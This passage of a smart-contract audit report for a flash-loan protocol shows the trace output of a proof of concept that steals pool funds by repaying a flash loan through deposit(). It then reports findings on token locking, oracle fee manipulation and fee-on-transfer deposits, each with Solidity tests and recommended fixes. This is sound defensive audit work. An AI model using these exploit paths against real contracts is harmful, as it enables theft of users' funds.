    ├─ [171041] ERC1967Proxy::fallback(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000000000000000000 [1e20], 0x)
    │   ├─ [170506] ThunderLoan::flashloan(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000000000000000000 [1e20], 0x) [delegatecall]
    │   │   ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   ├─ [912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(300000000000000000 [3e17])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003300900000000000 [1.003e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ emit FlashLoan(receiverAddress: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 100000000000000000000 [1e20], fee: 300000000000000000 [3e17], params: 0x)
    │   │   ├─ [6583] AssetToken::transferUnderlyingTo(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 100000000000000000000 [1e20])
    │   │   │   ├─ [3819] ERC20Mock::transfer(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 100000000000000000000 [1e20])
    │   │   │   │   ├─ emit Transfer(from: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], to: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], value: 100000000000000000000 [1e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [122855] Exp::executeOperation(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100000000000000000000 [1e20], 300000000000000000 [3e17], 0x00000000000000000000000000000000000001c8, 0x)
    │   │   │   ├─ [874] ERC20Mock::balanceOf(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD]) [staticcall]
    │   │   │   │   └─ ← [Return] 110000000000000000000 [1.1e20]
    │   │   │   ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 100300000000000000000 [1.003e20])
    │   │   │   │   ├─ emit Approval(owner: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 100300000000000000000 [1.003e20])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [48653] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100300000000000000000 [1.003e20])
    │   │   │   │   ├─ [48136] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100300000000000000000 [1.003e20]) [delegatecall]
    │   │   │   │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1003300900000000000 [1.003e18]
    │   │   │   │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   │   │   │   ├─ emit Deposit(account: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 100300000000000000000 [1.003e20])
    │   │   │   │   │   ├─ [25473] AssetToken::mint(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], 99970008997300809757 [9.997e19])
    │   │   │   │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], value: 99970008997300809757 [9.997e19])
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   │   │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   │   │   │   ├─ [3017] AssetToken::updateExchangeRate(300900000000000000 [3.009e17])
    │   │   │   │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003575355883651952 [1.003e18])
    │   │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   │   ├─ [6811] ERC20Mock::transferFrom(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 100300000000000000000 [1.003e20])
    │   │   │   │   │   │   ├─ emit Approval(owner: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   │   │   │   ├─ emit Transfer(from: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 100300000000000000000 [1.003e20])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Return] 
    │   │   │   ├─ [874] ERC20Mock::balanceOf(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD]) [staticcall]
    │   │   │   │   └─ ← [Return] 9700000000000000000 [9.7e18]
    │   │   │   └─ ← [Return] false
    │   │   ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
    │   │   │   └─ ← [Return] 1000300000000000000000 [1e21]
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [28599] Exp::sendAssetToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [874] ERC20Mock::balanceOf(Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD]) [staticcall]
    │   │   └─ ← [Return] 9700000000000000000 [9.7e18]
    │   ├─ [25719] ERC20Mock::transfer(0x00000000000000000000000000000000000001c8, 9700000000000000000 [9.7e18])
    │   │   ├─ emit Transfer(from: Exp: [0x5Ee7226D9ca1496074e4CAe0a8d939c0F1d9FeeD], to: 0x00000000000000000000000000000000000001c8, value: 9700000000000000000 [9.7e18])
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [21365] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [20848] ThunderLoan::redeem(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1003575355883651952 [1.003e18]
    │   │   ├─ [2852] AssetToken::balanceOf(0x00000000000000000000000000000000000001c8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Redeemed(account: 0x00000000000000000000000000000000000001c8, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amountOfAssetToken: 0, amountOfUnderlying: 0)
    │   │   ├─ [3508] AssetToken::burn(0x00000000000000000000000000000000000001c8, 0)
    │   │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000001c8, to: 0x0000000000000000000000000000000000000000, value: 0)
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [6583] AssetToken::transferUnderlyingTo(0x00000000000000000000000000000000000001c8, 0)
    │   │   │   ├─ [3819] ERC20Mock::transfer(0x00000000000000000000000000000000000001c8, 0)
    │   │   │   │   ├─ emit Transfer(from: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], to: 0x00000000000000000000000000000000000001c8, value: 0)
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [1712] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   ├─ [1195] ThunderLoan::getAssetFromToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [delegatecall]
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
    │   └─ ← [Return] 1000300000000000000000 [1e21]
    ├─ [0] VM::toString(1000300000000000000000 [1e21]) [staticcall]
    │   └─ ← [Return] "1000300000000000000000"
    ├─ [0] console::log("thunderLoan.Balance:", "1000300000000000000000") [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.87ms (2.10ms CPU time)
```



### Impact

All the funds of the AssetContract can be stolen.



### Recommendation

Add a check in ` deposit() ` to make it impossible to use it in the same block of the flash loan.

For example, registring the block.number in a variable in ` flashloan() ` and checking it in ` deposit() `.



## M-01.The liquidity provider's token can be permanently locked in contract

### Summary

If the owner calls the ` setAllowedToken ` function to remove a certain token, but a liquidity provider has already deposited that token into the pool, then the liquidity provider will never be able to redeem those funds afterward. 



### Vulnerability Details

This vulnerability is in the ` setAllowedToken ` function.

```solidity
function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    if (allowed) {
        ...
    } else {
        AssetToken assetToken = s_tokenToAssetToken[token];
        delete s_tokenToAssetToken[token];
        emit AllowedTokenSet(token, assetToken, allowed);
        return assetToken;
    }
}
```

If the owner calls the function to remove a certain token, any liquidity provider who has already deposited that token will never be able to redeem the tokens.



### Proof of Concept

#### Test Case

```solidity
function testLockTokens() public setAllowedToken hasDeposits {
    AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
    console.log("liquidityProvider tokenA Balance:", vm.toString(tokenA.balanceOf(address(assetToken))));
    thunderLoan.setAllowedToken(tokenA, false);
    vm.startPrank(liquidityProvider);
    vm.expectRevert(
        abi.encodeWithSelector(
            ThunderLoan.ThunderLoan__NotAllowedToken.selector, 
            address(tokenA));
    );
    thunderLoan.redeem(tokenA, type(uint256).max);
    vm.stopPrank();
}
```

#### Output

```bash
[PASS] testLockTokens() (gas: 2049470)
Logs:
  liquidityProvider tokenA Balance: 1000000000000000000000

Traces:
  [2109170] ThunderLoanTest::testLockTokens()
    ├─ [7662] ERC1967Proxy::fallback() [staticcall]
    │   ├─ [2648] ThunderLoan::owner() [delegatecall]
    │   │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   └─ ← [Return] ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    ├─ [0] VM::prank(ThunderLoanTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return]
    ├─ [1884002] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true)
    │   ├─ [1883482] ThunderLoan::setAllowedToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], true) [delegatecall]
    │   │   ├─ [3421] ERC20Mock::name() [staticcall]
    │   │   │   └─ ← [Return] "ERC20Mock"
    │   │   ├─ [3487] ERC20Mock::symbol() [staticcall]
    │   │   │   └─ ← [Return] "E20M"
    │   │   ├─ [1808403] → new AssetToken@0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c
    │   │   │   └─ ← [Return] 8683 bytes of code
    │   │   ├─ emit AllowedTokenSet(token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], asset: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], allowed: true)
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return]
    ├─ [47273] ERC20Mock::mint(0x000000000000000000000000000000000000007B, 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 1000000000000000000000 [1e21])
    │   └─ ← [Stop]
    ├─ [25234] ERC20Mock::approve(ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], 1000000000000000000000 [1e21])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [105453] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21])
    │   ├─ [104936] ThunderLoan::deposit(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000000 [1e21]) [delegatecall]
    │   │   ├─ [542] AssetToken::getExchangeRate() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [392] AssetToken::EXCHANGE_RATE_PRECISION() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ emit Deposit(account: 0x000000000000000000000000000000000000007B, token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], amount: 1000000000000000000000 [1e21])
    │   │   ├─ [47373] AssetToken::mint(0x000000000000000000000000000000000000007B, 1000000000000000000000 [1e21])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000007B, value: 1000000000000000000000 [1e21])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [2912] MockPoolFactory::getPool(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   │   │   └─ ← [Return] MockTSwapPool: [0xffD4505B3452Dc22f8473616d50503bA9E1710Ac]
    │   │   ├─ [310] MockTSwapPool::getPriceOfOnePoolTokenInWeth() [staticcall]
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   ├─ [3017] AssetToken::updateExchangeRate(3000000000000000000 [3e18])
    │   │   │   ├─ emit ExchangeRateUpdated(newExchangeRate: 1003000000000000000 [1.003e18])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [28711] ERC20Mock::transferFrom(0x000000000000000000000000000000000000007B, AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], 1000000000000000000000 [1e21])
    │   │   │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000007B, spender: ERC1967Proxy: [0xc7183455a4C133Ae270771860664b6B7ec320bB1], value: 0)
    │   │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000007B, to: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], value: 1000000000000000000000 [1e21])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop]
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [1712] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
    │   ├─ [1195] ThunderLoan::getAssetFromToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [delegatecall]
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [874] ERC20Mock::balanceOf(AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000 [1e21]
    ├─ [0] VM::toString(1000000000000000000000 [1e21]) [staticcall]
    │   └─ ← [Return] "1000000000000000000000"
    ├─ [0] console::log("liquidityProvider tokenA Balance:", "1000000000000000000000") [staticcall]
    │   └─ ← [Stop]
    ├─ [4515] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], false)
    │   ├─ [3995] ThunderLoan::setAllowedToken(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], false) [delegatecall]
    │   │   ├─ emit AllowedTokenSet(token: ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], asset: AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c], allowed: false)
    │   │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    │   └─ ← [Return] AssetToken: [0xa38D17ef017A314cCD72b8F199C0e108EF7Ca04c]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000007B)
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3: 0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002483ebfce70000000000000000000000005991a2df15a8f6a256d3ec51e99254cd3fb576a900000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [1946] ERC1967Proxy::fallback(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [1422] ThunderLoan::redeem(ERC20Mock: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   └─ ← [Revert] ThunderLoan__NotAllowedToken(0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9)
    │   └─ ← [Revert] ThunderLoan__NotAllowedToken(0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9)
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 4.34ms (1.83ms CPU time)
```



### Impact

This vulnerability can lead to the loss of user's funds.



### Recommendation

Check if the balance of the token contract is zero before the owner remove the token.

```solidity
function setAllowedToken(IERC20 token, bool allowed) external onlyOwner returns (AssetToken) {
    if (allowed) {
        ...
    } else {
        AssetToken assetToken = s_tokenToAssetToken[token];
        if (IERC20(token).balanceOf(address(assetToken)) == 0){
            delete s_tokenToAssetToken[token];
            emit AllowedTokenSet(token, assetToken, allowed);
        }
        return assetToken;
    }
}
```



## M-02.Attacker can manipulate the price of the oracle to control the fee

### Summary

Attacker can manipulate the price of the oracle to control the fee.



### Vulnerability Details

The protocol is using a liquidity pool on some exchange to return the price of an asset in WETH.

```solidity
function getPriceInWeth(address token) public view returns (uint256) {
    address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
    return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
}
```

The price is entirely dependent on ` s_poolFactory `, so attackers can manipulate the fee by controlling ` s_poolFactory `.



### Impact

The price is entirely manipulated by the attackers, resulting in a loss of profit.



### Recommendation

Use a manipulation-resistant oracle such as Chainlink. Do not use a liquidity pool to get prices.









## M-03.The amount intended for deposit may differ from the catual amount deposited

### Summary

The amount intended for deposit may differ from the actual amount deposited, which inevitably leads to a loss of funds for some users.



### Vulnerability Details

Some tokens have a trading fee.

For example, if you send 100 tokens with a fee of 0.3%, the recipient will only receive 99.7 tokens. However, in the ` deposit ` function, the input ` amount ` is directly stored without accounting for the fee. As a result, when User A wants to redeem his tokens, he might encounter an insufficient funds error. Alternatively, if User B also deposits the same token, part of User B's deposit might be used to fulfill User A's redemption request. This would lead to a loss of funds for User B or make it impossible for them to withdraw their tokens. Ultimately, there will definitely be users who cannot withdraw their tokens.

```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    ...
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
    emit Deposit(msg.sender, token, amount);
    assetToken.mint(msg.sender, mintAmount);
    uint256 calculatedFee = getCalculatedFee(token, amount);
    ...
    token.safeTransferFrom(msg.sender, address(assetToken), amount);
}
```



### Impact

This vulnerability can lead to the loss of users.



### Recommendation

Deposit the amount based on the final amount received.
